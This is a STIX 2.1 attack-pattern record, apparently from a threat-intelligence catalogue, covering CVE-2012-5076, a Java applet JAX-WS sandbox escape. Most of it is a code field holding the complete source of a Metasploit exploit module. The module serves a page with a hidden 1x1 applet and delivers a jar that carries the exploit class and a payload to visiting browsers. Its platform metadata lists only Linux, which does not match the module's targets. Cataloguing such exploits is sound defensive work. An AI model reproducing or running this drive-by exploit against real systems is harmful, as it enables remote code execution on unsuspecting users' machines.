{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3ec6ec96-3892-4a19-a10b-f96d5d83f17c",
    "created": "2024-08-14T17:06:26.426191Z",
    "modified": "2024-08-14T17:06:26.426195Z",
    "name": "Java Applet JAX-WS Remote Code Execution",
    "description": " This module abuses the JAX-WS classes from a Java Applet to run arbitrary Java code outside of the sandbox as exploited in the wild in November of 2012. The vulnerability affects Java version 7u7 and earlier.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_jre17_jaxws.rb",
            "external_id": "java_jre17_jaxws.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5076"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/javacpuoct2012-1515924.html"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2012/11/cool-ek-hello-my-friend-cve-2012-5067.html"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/mmpc/archive/2012/11/15/a-technical-analysis-on-new-java-vulnerability-cve-2012-5076.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n    super( update_info( info,\n      'Name'          => 'Java Applet JAX-WS Remote Code Execution',\n      'Description'   => %q{\n          This module abuses the JAX-WS classes from a Java Applet to run arbitrary Java\n        code outside of the sandbox as exploited in the wild in November of 2012. The\n        vulnerability affects Java version 7u7 and earlier.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Unknown', # Vulnerability Discovery\n          'juan vazquez' # metasploit module\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2012-5076' ],\n          [ 'OSVDB', '86363' ],\n          [ 'BID', '56054' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpuoct2012-1515924.html' ],\n          [ 'URL', 'http://malware.dontneedcoffee.com/2012/11/cool-ek-hello-my-friend-cve-2012-5067.html' ],\n          [ 'URL', 'http://blogs.technet.com/b/mmpc/archive/2012/11/15/a-technical-analysis-on-new-java-vulnerability-cve-2012-5076.aspx' ]\n        ],\n      'Platform'      => %w{ java win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Arch' => ARCH_JAVA,\n            }\n          ],\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-10-16'\n      ))\n  end\n\n\n  def on_request_uri( cli, request )\n    if not request.uri.match(/\\.jar$/i)\n      if not request.uri.match(/\\/$/)\n        send_redirect(cli, get_resource() + '/', '')\n        return\n      end\n\n      print_status(\"#{self.name} handling request\")\n\n      send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } )\n      return\n    end\n\n    paths = [\n      [ \"Exploit.class\" ],\n      [ \"MyPayload.class\" ]\n    ]\n\n    p = regenerate_payload(cli)\n\n    jar  = p.encoded_jar\n\n    paths.each do |path|\n      1.upto(path.length - 1) do |idx|\n        full = path[0,idx].join(\"/\") + \"/\"\n        if !(jar.entries.map{|e|e.name}.include?(full))\n          jar.add_file(full, '')\n        end\n      end\n      fd = File.open(File.join( Msf::Config.data_directory, \"exploits\", \"cve-2012-5076\", path ), \"rb\")\n      data = fd.read(fd.stat.size)\n      jar.add_file(path.join(\"/\"), data)\n      fd.close\n    end\n\n    print_status(\"Sending Applet.jar\")\n    send_response( cli, jar.pack, { 'Content-Type' => \"application/octet-stream\" } )\n\n    handler( cli )\n  end\n\n  def generate_html\n    jar_name = rand_text_alpha(rand(6)+3) + \".jar\"\n    html  = \"<html><head></head>\"\n    html += \"<body>\"\n    html += \"<applet archive=\\\"#{jar_name}\\\" code=\\\"Exploit.class\\\" width=\\\"1\\\" height=\\\"1\\\">\"\n    html += \"</applet></body></html>\"\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-16",
    "x_mitre_platforms": [
        "linux"
    ]
}